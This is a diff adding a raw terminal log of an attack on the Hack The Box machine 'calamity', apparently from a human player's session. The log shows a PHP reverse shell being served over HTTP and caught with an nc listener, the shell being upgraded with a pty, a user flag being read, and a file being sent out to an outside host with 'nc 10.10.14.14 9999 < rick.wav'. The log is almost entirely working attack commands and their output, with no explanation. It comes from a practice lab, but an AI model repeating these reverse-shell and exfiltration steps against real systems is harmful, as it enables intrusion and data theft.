@@ -1,0 +1,88 @@
+root@parrot:~/hackthebox/calamity#  vi creds                                    
+root@parrot:~/hackthebox/calamity# nc -nvlp 9001                                
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.27.      
+Ncat: Connection from 10.10.10.27:33024.                                        
+/bin/sh: 0: can't access tty; job control turned off                            
+$ root@parrot:~/hackthebox/calamity# cp /opt/php-reverse-shell/php-reverse-shell.php reverse.php    
+root@parrot:~/hackthebox/calamity# mkdir www                                    
+root@parrot:~/hackthebox/calamity# mv reverse.php www/                          
+root@parrot:~/hackthebox/calamity# cd www/                                      
+root@parrot:~/hackthebox/calamity/www# python -m SimpleHTTPServer               
+Serving HTTP on 0.0.0.0 port 8000 ...   
+10.10.10.27 - - [15/Jan/2020 03:07:51] "GET /reverse.php HTTP/1.1" 200 -        
+^CTraceback (most recent call last):    
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main          
+    "__main__", fname, loader, pkg_name)                                        
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                     
+    exec code in run_globals            
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>          
+    test()                              
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test              
+    BaseHTTPServer.test(HandlerClass, ServerClass)                              
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test                
+    httpd.serve_forever()               
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever         
+    poll_interval)                      
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry          
+    return func(*args)                  
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/calamity/www# nc -nvlp 9001                                                                                                            
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.27.      
+Ncat: Connection from 10.10.10.27:33028.                                        
+Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux                 
+ 03:10:05 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00                  
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT             
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                           
+/bin/sh: 0: can't access tty; job control turned off                            
+$ clear                                 
+TERM environment variable not set.      
+$ export TERM=screen-256color           
+$ which python                          
+/usr/bin/python                         
+$ python -c "import pty; pty.spawn('/bin/bash')"                                
+www-data@calamity:/$ ^Z                 
+[1]+  Stopped                 nc -nvlp 9001                                     
+root@parrot:~/hackthebox/calamity/www# stty raw -echo                           
+root@parrot:~/hackthebox/calamity/www# nc -nvlp 9001                            
+
+www-data@calamity:/$ clear              
+www-data@calamity:/$ ls                 
+bin   etc         initrd.img.old  media  proc  sbin  srv  usr      vmlinuz.old  
+boot  home        lib             mnt    root  sec   sys  var                   
+dev   initrd.img  lost+found      opt    run   snap  tmp  vmlinuz               
+www-data@calamity:/$ cd /dev/shm        
+www-data@calamity:/dev/shm$ ls -la      
+total 0             
+drwxrwxrwt  2 root root   40 Jan 15 02:37 .                                     
+drwxr-xr-x 18 root root 3880 Jan 15 02:37 ..                                    
+www-data@calamity:/dev/shm$ cd /home    
+www-data@calamity:/home$ ls             
+xalvas              
+www-data@calamity:/home$ cd xalvas/     
+www-data@calamity:/home/xalvas$ ls      
+alarmclocks  app  dontforget.txt  intrusions  peda  recov.wav  user.txt         
+www-data@calamity:/home/xalvas$ cat user.txt                                    
+0790e7be60d5cd7faeeb9ac550762e5e        
+www-data@calamity:/home/xalvas$ ls      
+alarmclocks  app  dontforget.txt  intrusions  peda  recov.wav  user.txt         
+www-data@calamity:/home/xalvas$ cd alarmclocks/                                 
+www-data@calamity:/home/xalvas/alarmclocks$ ls                                  
+rick.wav  xouzouris.mp3                 
+www-data@calamity:/home/xalvas/alarmclocks$ /dev/shm/ipp 10.10.14.14 9999 < rick.wav                
+bash: /dev/shm/ipp: No such file or directory                                   
+www-data@calamity:/home/xalvas/alarmclocks$ nc 10.10.14.14 9999 < rick.wav      
+Killed              
+www-data@calamity:/home/xalvas/alarmclocks$ nc 10.10.14.14 9999 < rick.wav      
+Killed              
+www-data@calamity:/home/xalvas/alarmclocks$ md5sum rick.wav                     
+a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav                                      
+www-data@calamity:/home/xalvas/alarmclocks$ ^C                                  
+www-data@calamity:/home/xalvas/alarmclocks$ exit                                
+exit                
+$                   
